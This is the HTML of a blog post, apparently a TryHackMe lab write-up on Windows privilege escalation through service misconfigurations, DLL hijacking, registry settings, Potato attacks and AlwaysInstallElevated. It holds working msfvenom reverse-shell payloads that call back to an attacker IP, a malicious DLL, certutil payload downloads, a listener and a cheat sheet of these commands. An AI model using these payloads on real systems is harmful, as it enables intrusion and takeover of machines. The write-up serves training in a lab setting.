@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Windows-PrivEsc-Arena TryHackMe writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  <link href="//www.google-analytics.com" rel="dns-prefetch">
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="During studying the TCM windows privielge escalation course this is the Lab designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="Windows-PrivEsc-Arena TryHackMe writeup">
+    <meta name="twitter:description" content="During studying the TCM windows privielge escalation course this is the Lab designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist
+">
+    <meta name="twitter:image" content="/media/windowsprivescarena/1634049883614.jpg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Windows-PrivEsc-Arena TryHackMe writeup">
+  <meta property="og:description" content="During studying the TCM windows privielge escalation course this is the Lab designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist
+">
+  <meta property="og:url" content="/post/windowsprivescarena/">
+  <meta property="og:image" content="/media/windowsprivescarena/1634049883614.jpg">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/windowsprivescarena/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/grey-prism.svg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle"></p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Windows-PrivEsc-Arena TryHackMe writeup</h1>
+      <p class="post-meta">@0xMesbaha · Apr 26, 2022 · 8 min read</p>
+    </header>
+    <article class="post-content"><p>During studying the <a href="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners">TCM windows privielge escalation course</a> this is the <a href="https://tryhackme.com/room/windowsprivescarena">Lab</a> designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist</p>
+<p>this room covers :</p>
+<ul>
+<li><a href="#service-escalation---unquoted-service-paths">Service Escalation - Unquoted Service Paths</a></li>
+<li><a href="#service-escalation---dll-hijacking">Service Escalation - DLL Hijacking</a></li>
+<li><a href="#service-escalation---registry">Service Escalation - Registry</a></li>
+<li><a href="#service-escalation---executable-files">Service Escalation - Executable Files</a></li>
+<li><a href="#service-escalation---binpath">Service Escalation - binPath</a></li>
+<li><a href="#potato-escalation---hot-potato">Potato Escalation - Hot Potato</a></li>
+<li><a href="#registry-escalation---autorun">Registry Escalation - Autorun</a></li>
+<li><a href="#registry-escalation---alwaysinstallelevated">Registry Escalation - AlwaysInstallElevated</a></li>
+<li><a href="#privilege-escalation---startup-applications">Privilege Escalation - Startup Applications</a></li>
+<li><a href="#password-mining-escalation---memory">Password Mining Escalation - Memory</a></li>
+<li><a href="#privilege-escalation---kernel-exploits">Privilege Escalation - Kernel Exploits</a></li>
+<li><a href="#quick-commands">quick commands</a></li>
+</ul>
+<hr>
+<ul>
+<li>
+<p>first you need to connect to THM with the openvpn as mentioned in task-1 , let&rsquo;s drive into the Room itself.</p>
+</li>
+<li>
+<p>As the room is discussing privilege escalation so it assumes you have compromised a windows machine in any way and you are now against the privesc step , that&rsquo;s why you are given the RDP connection directly.</p>
+</li>
+<li>
+<p>connect with RDP :</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">rdesktop 10.10.14.235 -u user -p password321
+</code></pre></div><h2 id="service-escalation---unquoted-service-paths">Service-Escalation - Unquoted Service Paths</h2>
+<ul>
+<li>Unquoted path escalation is the case when a service path is like :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Program Files\example 2\app.exe
+</code></pre></div><ul>
+<li>what happens to run the app.exe is as following:</li>
+</ul>
+<pre><code># Try :
+C:\Program.exe
+# if not found try :
+C:\Program Files\example.exe
+# if not found try :
+C:\Program Files\example 2\app.exe
+</code></pre><ul>
+<li>so if we have write access to the <code>C:\program Files\</code> we can place our <code>example.exe</code> so it can be used instead of the actual <code>app.exe</code> , and we can place a malicious app that can get us a reverse connection</li>
+<li>the mitigation is quite straight forward :  <code>&quot;C:\Program Files\example 2\app.exe&quot;</code></li>
+<li>Attack example :</li>
+<li>first you need to list the services along with the path :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-WmiObject win32_service | Select-Object Name, State, PathName
+</code></pre></div><p><img src="/media/windowsprivescarena/20220426022212.png" alt="image"></p>
+<ul>
+<li>to <strong>query the configuration information for a specified service</strong> we use :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sc qc unqoutedsvc
+</code></pre></div><p><img src="/media/windowsprivescarena/20220426022509.png" alt="image"></p>
+<ul>
+<li>now as we can see under the <code>BINARY_PATH</code> it is not quoted so we can try our luck there</li>
+<li>use <code>accesschk64.exe</code> to check our permissions for that path</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220426022820.png" alt="image"></p>
+<ul>
+<li>we can write into the path the following : <code>C:\Program\Unquoted path service\common.exe</code></li>
+<li>so let&rsquo;s generate the payload with msfvenom and send it to that path , then start the service</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.9.0.37 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f exe -o  common.exe
+</code></pre></div><p><img src="/media/windowsprivescarena/20220426023424.png" alt="image">
+<img src="/media/windowsprivescarena/20220426023436.png" alt="image"></p>
+<ul>
+<li>note that when the last sc command halts then terminated you will lose your connection so it is better to make a better than a reverse connection like adding a user to the administrator group instead :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">msfvenom -p windows/exec CMD=<span style="color:#e6db74">&#39;net localgroup administrators user /add&#39;</span> <span style="color:#f92672">-f</span> exe-service -o common.exe
+</code></pre></div><p><img src="/media/windowsprivescarena/20220426023931.png" alt="image"></p>
+<h2 id="service-escalation---dll-hijacking">Service Escalation - DLL Hijacking</h2>
+<ul>
+<li>My favorite escalation way , DLL Hijacking is very common escalation Factor you should consider,it is a little tricky to detect But easy to abuse.</li>
+<li>attackers usually copy the suspected executables and run them at their lab to analyze them</li>
+<li>in this lab we are working in same machine , you need <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> it is like <code>pspy</code> in linux But it tells us details about a process as we will see</li>
+<li>the idea behind DLL Hijacking is : finding a process searches for a DLL and not able to find it</li>
+<li>if we the attacker can write to the path , the process searches through , we can craft our own malicious DLL to perform administrative actions</li>
+<li>add the filters :</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425055638.png" alt="image">
+<img src="/media/windowsprivescarena/20220425055742.png" alt="image">
+<img src="/media/windowsprivescarena/20220425060520.png" alt="image"></p>
+<ul>
+<li>focusing on this <code>dllhijackservice</code> to understand how it searches for dlls :</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425060621.png" alt="image"></p>
+<ul>
+<li>it searches for a dll under <code> C:\Temp</code> which we have access to write</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425060723.png" alt="image"></p>
+<ul>
+<li>we craft our payload then place it in the <code>C:\Temp:\hijackme.dll</code> then start the service , the next time it starts it will find the missed dll and execute it</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#include &lt;windows.h&gt;</span>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+<span style="color:#66d9ef">if</span> (dwReason == DLL_PROCESS_ATTACH) {
+system(<span style="color:#e6db74">&#34;cmd.exe /k net localgroup administrators user /add&#34;</span>);  //replace command
+ExitProcess(0);
+}
+<span style="color:#66d9ef">return</span> TRUE;
+}
+</code></pre></div><ul>
+<li>compile it as dll :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">x86_64-w64-mingw32-gcc  dll.c -shared -o hijackme.dll
+</code></pre></div><ul>
+<li>move it and restart the service :</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425062428.png" alt="image"></p>
+<ul>
+<li>the user has been added to the local administrators group</li>
+</ul>
+<h2 id="service-escalation---registry">Service Escalation - Registry</h2>
+<ul>
+<li>List them :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">reg query HKLM\SYSTEM\CurrentControlSet\Services
+</code></pre></div><ul>
+<li>search for a service has <code>NT AUTHORITY\INTERACTIVE allow FullControl</code> :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Acl HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SYSTEM\CurrentControlSet\Services\regsvc | fl
+</code></pre></div><p><img src="/media/windowsprivescarena/20220425043012.png" alt="image"></p>
+<ul>
+<li>use the code <a href="https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c">here</a></li>
+<li>add what ever code you want to execute for example add current user to the administrator group</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cmd.exe /k net localgroup administrators user /add
+</code></pre></div><ul>
+<li>cross compile it :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">i686-w64-mingw32-gcc windows_service.c -o fake.exe
+</code></pre></div><ul>
+<li>send it to the windows then :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\fake.exe /f
+</code></pre></div><p><img src="/media/windowsprivescarena/20220425050400.png" alt="image"></p>
+<ul>
+<li>and we can see the user has been added to the local administrator group, trying to perform an administrative action the ACL will accept our password to grantee this action :</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425050748.png" alt="image"></p>
+<h2 id="service-escalation---executable-files">Service Escalation - Executable Files</h2>
+<ul>
+<li>finding a service we can overwrite and restart the service will gain us a reverse shell</li>
+<li>we can search for them by a tool like <code>powerup.ps1</code> or manually with <code>accesschk64.exe</code> on the services running , we can list them with powershell:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Service | Where-Object {$_.Status <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;Running&#34;</span>}
+</code></pre></div><p>or cmd :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sc.exe query type=service
+</code></pre></div><p><img src="/media/windowsprivescarena/20220425052239.png" alt="image"></p>
+<ul>
+<li>we see this file has write access by every body , we can simply generate with msfvenom a reverse executable and replace it , then start the service again :</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425052507.png" alt="image">
+<img src="/media/windowsprivescarena/20220425052537.png" alt="image">
+<img src="/media/windowsprivescarena/20220425052548.png" alt="image"></p>
+<ul>
+<li>we could also use the same exe from the registry escalation section</li>
+</ul>
+<h2 id="service-escalation---binpath">Service Escalation - binPath</h2>
+<ul>
+<li>we are after a service that has RW access for Everyone , we can search for it with :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> .\accesschk64.exe -wuvc Everyone *
+</code></pre></div><p><img src="/media/windowsprivescarena/20220426032527.png" alt="image"></p>
+<ul>
+<li>if we have the : <code>SERVICE_CHANGE_CONFIG</code></li>
+<li>we can now leverage our privilege by writing a new configuration then start the service</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">sc config daclsvc binpath= <span style="color:#e6db74">&#34;net localgroup administrators user /add&#34;</span>
+</code></pre></div><p><img src="/media/windowsprivescarena/20220426032937.png" alt="image">
+<img src="/media/windowsprivescarena/20220426032947.png" alt="image"></p>
+<h2 id="potato-escalation---hot-potato">Potato Escalation - Hot Potato</h2>
+<ul>
+<li>the potato attacks are so famous when it comes to windows , actually there are more than one type of potato attack , you can refer to <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">this</a> blog.</li>
+<li>the attack vector was fixed in <code>MS16-075</code> , probably windows 7 is vulnerable.</li>
+<li>we can list last updates :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">wmic qfe list full /format:table
+</code></pre></div><ul>
+<li>searching for the 3 installs , will find none of them patching the vuln</li>
+<li>there are multiple ways to attack hot potato like metasploit , powershell , potato.exe , refer <a href="https://pentestlab.blog/2017/04/13/hot-potato/">here</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">. .\tater.ps1
+Invoke-Tater -Trigger 1 -Command <span style="color:#e6db74">&#34;net localgroup administrators user /add&#34;</span>
+</code></pre></div><p><img src="/media/windowsprivescarena/20220425064312.png" alt="image"></p>
+<ul>
+<li>and we can see the user has been added to the local administrator Group</li>
+</ul>
+<h2 id="registry-escalation---autorun">Registry Escalation - Autorun</h2>
+<ul>
+<li>first you need to run <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns64.exe</a> to list the auto runs applications</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220422205427.png" alt="image"></p>
+<ul>
+<li>we can notice the program.exe running under <code>C:\Program Files\Autorun Program\</code> ,now we should use <code>accesschk64.exe</code> to check our privilege on that path</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220422205719.png" alt="image"></p>
+<ul>
+<li>it has read/write access For everyone , so we can replace the <code>program.exe</code> with a malicious payload to gain a reverse shell as higher privilege</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=9090 <span style="color:#f92672">-f</span> exe -o  program.exe
+</code></pre></div><ul>
+<li>fire up your http server then from the windows machine download it :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">certutil -urlcache -f http://10.9.0.37:8888/program.exe program.exe
+</code></pre></div><ul>
+<li>rename it to <code>program.exe</code> as the auto runner program , copy  &amp; overwrite it :</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220422210828.png" alt="image"></p>
+<ul>
+<li>now set you listener :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -x <span style="color:#e6db74">&#34;use exploit/multi/handler;set LHOST 10.9.0.37;set LPORT 9090;set payload windows/meterpreter/reverse_tcp;run&#34;</span>
+</code></pre></div><ul>
+<li>login with admin account :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">rdesktop 10.10.174.128  -u TCM -p Hacker12
+</code></pre></div><p><img src="/media/windowsprivescarena/20220425041654.png" alt="image">
+<img src="/media/windowsprivescarena/20220425041715.png" alt="image"></p>
+<h2 id="registry-escalation---alwaysinstallelevated">Registry Escalation - AlwaysInstallElevated</h2>
+<p>check <code>AlwaysinstalledElevated</code> is on if the value <code>= 0x1</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+</code></pre></div><p><img src="/media/windowsprivescarena/20220425042010.png" alt="image"></p>
+<p>craft  msi payload :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=7878 <span style="color:#f92672">-f</span> msi -o setup.msi
+</code></pre></div><p>move it to the machine and run it :</p>
+<p><img src="/media/windowsprivescarena/20220425042353.png" alt="image"></p>
+<p><img src="/media/windowsprivescarena/20220425042406.png" alt="image"></p>
+<h2 id="privilege-escalation---startup-applications">Privilege Escalation - Startup Applications</h2>
+<ul>
+<li>we can search for this attack vector by running :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">icacls.exe <span style="color:#e6db74">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span>
+</code></pre></div><p><img src="/media/windowsprivescarena/20220425053053.png" alt="image"></p>
+<p>we can see that Builtin\Users has the <strong>F</strong> flag meaning full control , Built-in user account is <strong>a type of user account that is created during installation</strong></p>
+<ul>
+<li>simply copy a malicious executable to <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\</code></li>
+<li>then when an administrator logs in you will gain a reverse shell</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425053954.png" alt="image">
+<img src="/media/windowsprivescarena/20220425054009.png" alt="image"></p>
+<h2 id="password-mining-escalation---memory">Password Mining Escalation - Memory</h2>
+<ul>
+<li>the discussed attack can be helpful in phishing demonstration , will use metasploit as :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">msfconsole -x <span style="color:#e6db74">&#34;use auxiliary/server/capture/http_basic;set uripath x ; run&#34;</span>
+</code></pre></div><ul>
+<li>This module responds to all requests for resources with a HTTP 401. This should cause most browsers to prompt for a credential. If the  user enters Basic Auth creds they are sent to the console</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220426025112.png" alt="image">
+<img src="/media/windowsprivescarena/20220426025125.png" alt="image"></p>
+<ul>
+<li>and we have captured his password as we see ;)</li>
+<li>for password mining winpeas are helpful hence it searches for any file its name or content contain words like passwords , key , .. etc</li>
+</ul>
+<h2 id="privilege-escalation---kernel-exploits">Privilege Escalation - Kernel Exploits</h2>
+<ul>
+<li>when it comes to old versions of windows (xp,7,8) it most likely can be exploit using kernel exploitation techniques.</li>
+<li>to detect if it is vulnerable , run <code>systeminfo</code> ,take the output and pass it to <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a> tool</li>
+<li><strong>NOTE</strong>  <code>windows-exploit-suggester</code> can reveal other attack vectors rather than the kernel exploits</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">python windows-exploit-suggester.py --database 2022-04-25-mssb.xls --systeminfo ~/CTFs/Tryhackme/windowsprivescarena/kernel_search
+</code></pre></div><ul>
+<li>but the easiest way is to get a meterpreter shell and use the  run <code>local_exploit_suggester</code></li>
+<li>note that exploiting not compatible kernel exploit can harm the system , so keep it your last option</li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220425071551.png" alt="image"></p>
+<p><img src="/media/windowsprivescarena/20220425072907.png" alt="image"></p>
+<h2 id="automation">Automation</h2>
+<ul>
+<li>there a lot of tools you can use like <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20220424/winPEASx64.exe">Winpeas</a> , But Let&rsquo;s Try <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a></li>
+</ul>
+<p><img src="/media/windowsprivescarena/20220426034956.png" alt="image"></p>
+<p><img src="/media/windowsprivescarena/20220426035018.png" alt="image"></p>
+<h2 id="quick-commands">Quick commands</h2>
+<p><code>Download files from your http server to windows :</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">certutil -urlcache -f &lt;url&gt; &lt;outfile_name&gt;
+Invoke-WebRequest -Uri &lt;url&gt; -OutFile &lt;outfile_name&gt;
+</code></pre></div><ul>
+<li>Remember if you are going to use ftp server , in case moving exe files to use  <code>binary on</code></li>
+</ul>
+<p><code>Generate payloads :</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># exe payload to get reverse shell</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.9.0.37 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f exe -o  common.exe
+<span style="color:#75715e"># exe payload to execute commands</span>
+msfvenom -p windows/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;net localgroup administrators user /add&#39;</span> -f exe-service -o common.exe
+<span style="color:#75715e"># msi payload (for AlwaysInstallElevated)</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.9.0.37 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">7878</span> -f msi -o setup.msi
+</code></pre></div><ul>
+<li>quick msfconsole listener :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -x <span style="color:#e6db74">&#34;use exploit/multi/handler;set LHOST &lt;ip&gt;;set LPORT &lt;port&gt;;set payload windows/meterpreter/reverse_tcp;run&#34;</span>
+</code></pre></div><h3 id="useful-resources-">Useful Resources :</h3>
+<ul>
+<li><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">Potatoes_Windows_Privesc</a></li>
+<li><a href="https://nored0x.github.io/red-teaming/windows-enumeration/">windows-enumeration</a></li>
+<li><a href="https://liberty-shell.com/sec/2018/02/10/msfv/">msfveom-cheatsheet</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">PayloadsAllTheThings</a></li>
+<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation">hacktricks</a></li>
+<li><a href="https://lolbas-project.github.io/">lolbas-project</a></li>
+</ul></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/tryhackme"><span class="tag">TryHackme</span></a></li>
+        
+          <li><a href="/tags/windows-privesc"><span class="tag">Windows-Privesc</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
